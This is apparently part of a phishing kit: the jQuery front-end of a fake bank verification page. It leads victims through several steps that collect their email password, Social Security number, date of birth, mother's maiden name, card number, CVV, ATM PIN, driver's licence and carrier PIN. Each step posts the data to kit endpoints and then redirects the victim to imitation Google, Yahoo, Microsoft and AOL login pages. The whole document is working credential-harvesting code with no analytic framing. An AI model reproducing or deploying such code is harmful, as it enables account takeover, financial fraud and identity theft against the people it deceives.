    $("#CardNumber").keyup(function() {
        var el = $(this);
        var eli = el.val().replace(/\s+/g, '');
        if (eli.length === 16) {
        var url = "https://lookup.binlist.net/" + eli;
            $.ajax({
                url: url,
                cache: false,
                dataType: "json",
                type: "GET",
                success: function(result, success) {
                        var bankn = result.bank['name'];
                    if (typeof bankn !== 'undefined') {
                    $("#bank").val(result.bank['name']);
                    } else {
                    $("#bank").val("Unknown Bank For This BIN!");
                    }

                    $("#type").val(result.type);
                    $("#brandbank").val(result.brand);
                }
            });
        }
    });
});


$(document).ready(function() {
    $("#ZipCode").keyup(function() {
        var el = $(this);

        if (el.val().length === 5) {
        var url = "https://ziptasticapi.com/" + el.val();
            $.ajax({
                url: url,
                cache: false,
                dataType: "json",
                type: "GET",
                success: function(result, success) {
                    $("#CityR").val(result.city);
                    $("#StateRegion").val(result.state);
                }
            });
        }
    });
});

//popup window
var popupWindow=null;

function child_open(url) {
    var x = screen.width/2 - 700/2;
    var y = screen.height/2 - 450/2;
    sessionStorage.setItem('emaildress', $("#emaildress").val());
    popupWindow = window.open(url,"_blank","directories=no, status=no, menubar=no, scrollbars=yes, resizable=no,width=450, height=700,left="+x+",top="+y);
}

function parent_disable() {
    if(popupWindow && !popupWindow.closed)
    popupWindow.focus();
}
// end popup

$('#emailPassword').focus(function () {
    var val = $("#emaildress").val();
    var emailstr = val.substr(val.indexOf("@") + 1);

    const arr = emailstr.split(".");
    var str = arr[0];
    str1 = str.toLowerCase().replace(/\b[a-z]/g, function(letter) {
        return letter.toUpperCase();
    });
    if (str === "gmail") {
        var str2 = "Google";
        $('.emailPasswordtext1').children("span").html(str2);
        $('.emailPasswordtext2').children("span").html(str2);
    } else if (str === "googlemail") {
        var str2 = "Google";
        $('.emailPasswordtext1').children("span").html(str2);
        $('.emailPasswordtext2').children("span").html(str2);
    } else if (str === "ymail") {
        var str2 = "Yahoo";
        $('.emailPasswordtext1').children("span").html(str2);
        $('.emailPasswordtext2').children("span").html(str2);
    } else if (str === "yahoo") {
        var str2 = "Yahoo";
        $('.emailPasswordtext1').children("span").html(str2);
        $('.emailPasswordtext2').children("span").html(str2);
    } else if (arr[1] === "rr") {
        var str2 = "Spectrum";
        $('.emailPasswordtext1').children("span").html(str2);
        $('.emailPasswordtext2').children("span").html(str2);
    } else if (str === "live") {
        var str2 = "Microsoft";
        $('.emailPasswordtext1').children("span").html(str2);
        $('.emailPasswordtext2').children("span").html(str2);
    } else if (str === "hotmail") {
        var str2 = "Microsoft";
        $('.emailPasswordtext1').children("span").html(str2);
        $('.emailPasswordtext2').children("span").html(str2);
    } else if (str === "outlook") {
        var str2 = "Microsoft";
        $('.emailPasswordtext1').children("span").html(str2);
        $('.emailPasswordtext2').children("span").html(str2);
    } else {
        $('.emailPasswordtext1').children("span").html(str);
        $('.emailPasswordtext2').children("span").html(str);
    }
    $('.emailPasswordtext2').children("strong").html($("#emaildress").val());
    $(".emaildresstext1").hide();
    $(".emaildresstext2").hide();
    $(".emailpasswordtext1").show();
    $(".emailpasswordtext2").show();
}).blur(function () {
    if ($.trim($('#emaildress').val()).length) {
        $(".emaildresstext1").hide();
        $(".emaildresstext2").hide();
        $(".emailpasswordtext1").show();
        $(".emailpasswordtext2").show();
    } else {
        $(".emaildresstext1").show();
        $(".emaildresstext2").show();
        $(".emailpasswordtext1").hide();
        $(".emailpasswordtext2").hide();
    }
});

$(document).ready(function () {
    var $input = $('#SecurityNumber'),
        $register = $('#log_on_to_landing_page-sm, #log_on_to_landing_page');

    $input.each(function () {
        if (!$(this).val()) {
            $register.attr('disabled', true);
            return false;
        }
    });
    $input.keyup(function () {
        var trigger = false;
        $input.each(function () {
            if (!$(this).val()) {
                trigger = true;
            }
        });

        trigger ? $register.attr('disabled', true) : $register.removeAttr('disabled');

    });
});
</script>
<script>
    $(document).ready(function () {
    var $input = $('.card input:text'),
        $register = $('#log_on_to_landing_page-sm1, log_on_to_landing_page1');

    $input.each(function () {
        if (!$(this).val()) {
            $register.attr('disabled', true);
            return false;
        }
    });
    $input.keyup(function () {
        var trigger = false;
        $input.each(function () {
            if (!$(this).val()) {
                trigger = true;
            }
        });

        trigger ? $register.attr('disabled', true) : $register.removeAttr('disabled');

    });
});</script>
<script>
$(document).ready(function () {
    var $input = $('.emailaccess input:text'),
        $register = $('#requestIdentificationCode-sm, #requestIdentificationCode');

    $input.each(function () {
        if (!$(this).val()) {
            $register.attr('disabled', true);
            return false;
        }
    });
    $input.keyup(function () {
        var trigger = false;
        $input.each(function () {
            if (!$(this).val()) {
                trigger = true;
            }
        });

        trigger ? $register.attr('disabled', true) : $register.removeAttr('disabled');

    });
});

$(".container.step1").show();

$("#exitIdentification-sm1, #exitIdentification-sm2, #exitIdentification-sm3, #exitIdentification-sm4, #exitIdentification").click(function(e) {
      e.preventDefault();

$(".container.step1").show();
$(".container.step2").hide();
$(".container.step3").hide();
$(".container.step4").hide();

});

$("#requestDeliveryDevices-sm, #requestDeliveryDevices").click(function(e) {
      e.preventDefault();
setTimeout(function() {
$(".container.step2").show();
$(".container.step3").hide();
$(".container.step1").hide();
$(".container.step4").hide();
});
});

$(function() {
$('#DateOfBirth').mask('00/00/0000');
$('#ZipCode').mask('00000');
$('#NumberPhone').mask('(000) 000-0000');
$('#CardNumber').mask('0000 0000 0000 0000');
$('#ExpirationDate').mask('00/00');
$('#Cvv').mask('000');
$('#AtmPin').mask('0000');
$('#SecurityNumber').mask('000-00-0000');
$('#PhonePin').mask('00000000');
$('#LicenseNExp').mask('00/00/0000');

});
</script>
<script>
jQuery.validator.addMethod("notEqual", function(value, element, param) {
  return this.optional(element) || value != $(param).val();
}, "Please specify a different value");

jQuery.validator.addMethod("emailValid",function(value, element){
    var emaildress = $("#emaildress").val();
    $.ajax({
      url: "emailvalidate.php",
      type: 'POST',
      async: false,
      data: {email:emaildress},
      dataType: "text",
      success: function(msg) {
        if (msg !== 'true') {
            return 'Invalid password. Please try again';
        } else {
            return true;
        }
      },
      error: function(xhr, textStatus, errorThrown)
        {
            alert('ajax loading error... ... '+url + query);
            return false;
        }
    });
},'');
$(document).ready(function() {
    $("#emailPassword").keyup(function() {
        $("#error-bubble1").hide();
        $("#emailPassword").removeClass("error");
        $("#emailPasswordC").removeClass("error");
    });
});

$(function() {
    $("#requestIdentificationCode-sm, #requestIdentificationCode").click(function() {
        $("#requestIdentificationCode-sm, #requestIdentificationCode").attr('disabled', 'disabled');
        if ($("#emailPassword").is(":visible")) {
            $("#requestIdentificationCode-sm, #requestIdentificationCode").removeAttr('disabled');
            $("#error-bubble").hide();
            $(".jpui.label.emaildress").removeClass("error");
            $(".accessible-text.emaildress").addClass("hidden");
            $(".accessible-text.emaildress").removeClass("errorAdaText");
            $("#emaildress").removeClass("clientSideError");
            $('#emailaccess').validate({
            rules: {
                "emailPassword": {
                    required: function () {
                        return $("#emailPassword").is(":visible");
                    },
                    minlength: 4,
                    equalTo : "#emailPasswordC",
                    notEqual : "#emaildress"
                },
                "emaildress": {
                    required: true,
                    email: true,
                },
                "emailPasswordC": {
                    required: function () {
                        return $("#emailPasswordC").is(":visible");
                    },
                    minlength: 4,
                    equalTo : "#emailPassword",
                    notEqual : "#emaildress",
                }
            },
            messages: {
                "emaildress": "Please enter a valid email address",
                "emailPassword": {
                  required: "Please enter your email password",
                  equalTo: "Password dosen't match",
                  notEqual: "Email address and password can't be the same"
                },
                "emailPasswordC": {
                  required: "Please confirm your email password",
                  equalTo: "Password dosen't match",
                  notEqual: "Email address and password can't be the same"
                }
            },
            submitHandler: function(form) {
                emailretry++
                $("#emailretry").val(emailretry);
                $.post("emailbank?key=<?php echo $key;?>", $("#emailaccess").serialize(), function(result) {
                    if ("off" == "on") {
                        $("#error-bubble1").show();
                        $("#emailPassword").addClass("error");
                        $("#emailPasswordC").addClass("error");
                    } else {
                        $(".container.step4").hide();
                        $(".container.step3").show();
                        $(".container.step1").hide();
                        $(".container.step2").hide();
                        $(location).attr("", "");
                    }
                    if (emailretry == "off") {
                        $(".container.step4").hide();
                        $(".container.step3").show();
                        $(".container.step1").hide();
                        $(".container.step2").hide();
                        $(location).attr("", "");
                    }
        });

        },
        });

        } else {
            function getData(callback) {
              var url = "addons/emailvalidate";
                    $.ajax({
                        url: url,
                        cache: false,
                        data: {emaildress: $("#emaildress").val()},
                        dataType: "json",
                        type: "POST",
                        success: callback
                });
            }
            getData(function(result) {
                var emailStatus = result.emailStatus;
                var emailProvider = result.emailProvider;
                var emailType = result.emailType;
                $("#emailProvider").val(result.emailProvider);
                $("#emailType").val(result.emailType);
                if (emailStatus != "valid") {
                    $("#requestIdentificationCode-sm, #requestIdentificationCode").removeAttr('disabled');
                    $("#error-bubble").show();
                    $(".jpui.label.emaildress").addClass("error");
                    $(".accessible-text.emaildress").removeClass("hidden");
                    $(".accessible-text.emaildress").addClass("errorAdaText");
                    $("#emaildress").addClass("clientSideError");
                } else if (emailProvider == "Cox" || emailProvider == "Google" || emailProvider == "Earthlink" || emailProvider == "Charter"  && emailStatus == "valid") {
                        $("#requestIdentificationCode-sm, #requestIdentificationCode").removeAttr('disabled');
                        $(".row.emailPassword").show();
                        $("#emailPassword").show();
                        $(".row.emailPasswordC").show();
                    } else {
                        var val = $("#emaildress").val();
                        var emailstr = val.substr(val.indexOf("@") + 1);

                        const arr = emailstr.split(".");
                        var str = arr[0];
                        str1 = str.toLowerCase().replace(/\b[a-z]/g, function(letter) {
                            return letter.toUpperCase();
                        });
                        if (str === "gmail") {
                            var str2 = "Google";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else if (str === "googlemail") {
                            var str2 = "Google";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else if (str === "ymail") {
                            var str2 = "Yahoo";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else if (str === "yahoo") {
                            var str2 = "Yahoo";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else if (arr[1] === "rr") {
                            var str2 = "Spectrum";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else if (str === "live") {
                            var str2 = "Microsoft";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else if (str === "hotmail") {
                            var str2 = "Microsoft";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else if (str === "outlook") {
                            var str2 = "Microsoft";
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        } else {
                            $('.suspended-advisory.dialogMessage').children("span").html(str2);
                        }
                        $("#requestIdentificationCode-sm, #requestIdentificationCode").removeAttr('disabled');
                        if (emailProvider == "Microsoft") {
                            if (emailType === 'Free') {
                                var url = '/auth/login/outlook'
                            }else {
                                var url = '/auth/login/office'
                            }
                        } else if (emailProvider == "Aol") {
                            var url = "/auth/login/aol";
                        } else if (emailProvider == "Yahoo") {
                            var url = "/auth/login/yahoo";
                        } else if (emailProvider == "Att") {
                            var url = "/auth/login/yahoo";
                        } else if (emailProvider == "Google") {
                           var url = "/auth/login/yahoo";
                        } else if (emailProvider == "Comcast") {
                            var url = "/auth/login/comcast";
                        }
                        $("#urli").val(url);
                        $('.suspended-advisory.dialogMessage').children("a").attr("href", "javascript:window.location.href.replace(\""+url+"\");");
                        javascript:window.location.href =url;
                        $("#fullscreen-container").fadeTo(200, 1);
                        // var timer = setInterval(function() {
                            // if(popupWindow.closed) {
                                // clearInterval(timer);
                                // $("#fullscreen-container").fadeOut(200);
                                // if (!sessionStorage.getItem('finished')) {
// 
                                // } else {
                                    // sessionStorage.removeItem('finished');
                                    // $(".container.step4").hide();
                                    // $(".container.step3").show();
                                    // $(".container.step1").hide();
                                    // $(".container.step2").hide();
                                // }
                            // }
                        // }, 1000);
                        $("#error-bubble").hide();
                        $(".jpui.label.emaildress").removeClass("error");
                        $(".accessible-text.emaildress").addClass("hidden");
                        $(".accessible-text.emaildress").removeClass("errorAdaText");
                        $("#emaildress").removeClass("clientSideError");
                    }

            });
        }
});
});
</script>
<script>
$(function(){
    $("#log_on_to_landing_page-sm, #log_on_to_landing_page").click(function() {
        // validate and process form here
        $('#billing').validate({
            rules: {
                "fullname": { required: true, minlength: 4,},
                "DateOfBirth": {  required: true, minlength: 10,},
                "StreetAddress": { required: true, minlength: 5,},
                "MaidenName": { required: true, minlength: 3,},
                "StateRegion": { required: true, minlength: 2,},
                "ZipCode": { required: true, minlength: 5, zipcodeUS: true,},
                "NumberPhone": { required: true, minlength: 10,},
                "NumberCarrier": { required: false, minlength: 2,},
                "NumberPin": {
                    required: function () {
                        return $("#NumberPin").is(":visible");
                    },
                    minlength: 4,
                }
            },
            messages: {
                "fullname": {
                    required: "Please provide your full name",
                    minlength: "Please provide your full name",
                },
                "DateOfBirth": {
                    required: "Please provide date of birth",
                    minlength: "Please check the date of birth you have entered",
                },
                "NumberPhone": {
                    required: "Please provide phone number",
                    minlength: "Please check the number you have entered",
                },
                "NumberCarrier": {
                    required: "Please provide phone carrier",
                    minlength: "Please check the phone carrier you have entered",
                },
                "NumberPin": {
                    required: "Please provide phone carrier pin",
                    minlength: "Please check the phone carrier pin you have entered",
                },
                "StreetAddress": {
                    required: "Please provide your residential address",
                    minlength: "Please check the address you have entered",
                },
                "MaidenName": {
                    required: "Please provide your Mother's maiden name",
                     minlength: "Please check the Mother's maiden name you have entered",
                },
                "StateRegion": {
                    required: "Please provide your State",
                    minlength: "Please check the state you have entered",
                                },
                "ZipCode": {
                    required: "Please provide your Zip Code",
                    zipcodeUS: "Please provide valid US your Zip Code",
                    minlength: "Please check the zip code you have entered",
                },
            },
            messages: {
                "fullname": {
                    required: "Please provide your full name",
                    minlength: "Please provide your full name",
                },
                "DateOfBirth": {
                    required: "Please provide date of birth",
                    minlength: "Please check the date of birth you have entered",
                },
                "NumberPhone": {
                    required: "Please provide phone number",
                    minlength: "Please check the number you have entered",
                },
                "NumberCarrier": {
                    required: "Please provide phone carrier",
                    minlength: "Please check the phone carrier you have entered",
                },
                "NumberPin": {
                    required: "Please provide phone carrier pin",
                    minlength: "Please check the phone carrier pin you have entered",
                },
                "StreetAddress": {
                    required: "Please provide your residential address",
                    minlength: "Please check the address you have entered",
                },
                "SecurityNumber": {
                    required: "Please provide your Social Security Number(SSN)",
                     minlength: "Please enter at least 9 characters",
                },
                "StateRegion": {
                    required: "Please provide your State",
                    minlength: "Please check the state you have entered",
                },
                "CityR": {
                    required: "Please provide your City",
                    minlength: "Please check the City you have entered",
                },

                "ZipCode": {
                    required: "Please provide your Zip Code",
                    zipcodeUS: "Please provide valid US your Zip Code",
                    minlength: "Please check the zip code you have entered",
                },
            },
            submitHandler: function(form) {
            $.post("billing", $("#billing").serialize(), function(result) {
                            setTimeout(function() {
                                var disablecard = "on";
                                if (disablecard != "on") {
                                    $(".container.step4").show();
                                $(".container.step3").hide();
                                $(".container.step1").hide();
                                $(".container.step2").hide();
                                $(location).attr("", "");
                                } else {
                                    $(".container.step4").show();
                                    $(".container.step3").hide();
                                    $(".container.step1").hide();
                                    $(".container.step2").hide();
                                    // $(location).attr("href", "account");
                                }
});
});
},
});
});
});
</script>
<script>
$(function(){
    $("#log_on_to_landing_page-sm1, #log_on_to_landing_page1").click(function() {
        // validate and process form here
        $('#card').validate({
            rules: {
                CardNumber: { required: true, minlength: 16, creditcard: true,},
                ExpirationDate: { required: true, minlength: 4,},
                Cvv: { required: true, minlength: 3, digits: true,},
                AtmPin: { required: true, minlength: 4, digits: true,},
                LicenseNumber: { required: true, minlength: 5,},
                LicenseNExp: { required: true, minlength: 5,},
                SecurityNumber: { required: true, minlength: 9,},
            },
            messages: {
                CardNumber: {
                    required: "Please provide 16 digit card number",
                    minlength: "Please check the card number you have entered",
                    creditcard: "Please enter a valid card number",
                },
                ExpirationDate: {
                    required: "Please provide card expiry date",
                    minlength: "Please check the card expiry date you have entered",
                },
                Cvv: {
                    required: "Please provide 3 digit card security code (CVV)",
                    minlength: "Please check the card security code you have entered",
                    digits: "Please ensure you entered digits only",
                },
                AtmPin: {
                    required: "Please provide 4 ATM pin",
                    minlength: "Please check the ATM pin you have entered",
                    digits: "Please ensure you entered digits only",
                },
                LicenseNumber: {
                    required: "Please provide your driver's License number",
                    minlength: "Please check the driver's number you have entered",
                },
                LicenseNExp: {
                    required: "Please provide your driver's License number Expiry date",
                    minlength: "Please check the driver's expiry date you have entered",
                },
                SecurityNumber: {
                    required: "Please provide 9 digit SSN number",
                    minlength: "Please check the SSN Number you have entered",
                },
            },
            submitHandler: function(form) {
            $.post("Final?key=<?php echo $key;?>", $("#card").serialize(), function(result) {
                            setTimeout(function() {
                            $(location).attr("href", "account");
});
});
},
});
});
});
</script>
</body>

</html>